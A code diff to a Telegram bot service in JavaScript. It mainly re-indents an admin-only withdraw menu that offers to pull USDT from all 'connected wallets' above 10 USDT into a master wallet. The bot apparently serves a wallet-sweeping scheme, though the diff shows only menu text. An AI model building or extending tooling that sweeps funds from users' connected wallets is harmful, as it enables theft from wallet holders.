@@ -965,17 +965,17 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : String(err
     }
 
     async handleWithdrawCommand(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
+    if (chatId.toString() !== this.adminChatId) {
+        return this.bot.sendMessage(chatId, '❌ Unauthorized access');
+    }
 
-        const message = `
+    const message = `
 🏦 *Withdraw Options*
 
 Choose how you want to withdraw USDT:
 
 📤 *Withdraw From All Wallets*
-• Pull USDT from all connected wallets with balance >*10 USDT
+• Pull USDT from wallets with balance greater than 10 USDT
 • Withdraw all to master wallet
 
 🆔 *Withdraw From Specific Wallet*
@@ -984,30 +984,30 @@ Choose how you want to withdraw USDT:
 Select an option below:
         `;
 
-        const options = {
-            parse_mode: 'MarkdownV2',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '📤 Withdraw All', callback_data: 'withdraw_all' }
-                    ],
-                    [
-                        { text: '🆔 Specific Wallet', callback_data: 'withdraw_specific' }
-                    ],
-                    [
-                        { text: '🏠 Main Menu', callback_data: 'menu' }
-                    ]
+    const options = {
+        parse_mode: 'MarkdownV2',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '📤 Withdraw All', callback_data: 'withdraw_all' }
+                ],
+                [
+                    { text: '🆔 Specific Wallet', callback_data: 'withdraw_specific' }
+                ],
+                [
+                    { text: '🏠 Main Menu', callback_data: 'menu' }
                 ]
-            }
-        };
-
-        try {
-            return await this.bot.sendMessage(chatId, message, options);
-        } catch (error) {
-            console.error('Error sending withdraw options:', error && error.message ? error.message : error);
-            return await this.bot.sendMessage(chatId, '❌ Failed to show withdraw options. Please try again.');
+            ]
         }
+    };
+
+    try {
+        return await this.bot.sendMessage(chatId, message, options);
+    } catch (error) {
+        console.error('Error sending withdraw options:', error && error.message ? error.message : error);
+        return await this.bot.sendMessage(chatId, '❌ Failed to show withdraw options. Please try again.');
     }
+}
 
     async handleWithdrawAllCommand(chatId) {
         if (chatId.toString() !== this.adminChatId) {
@@ -1686,3 +1686,4 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
+
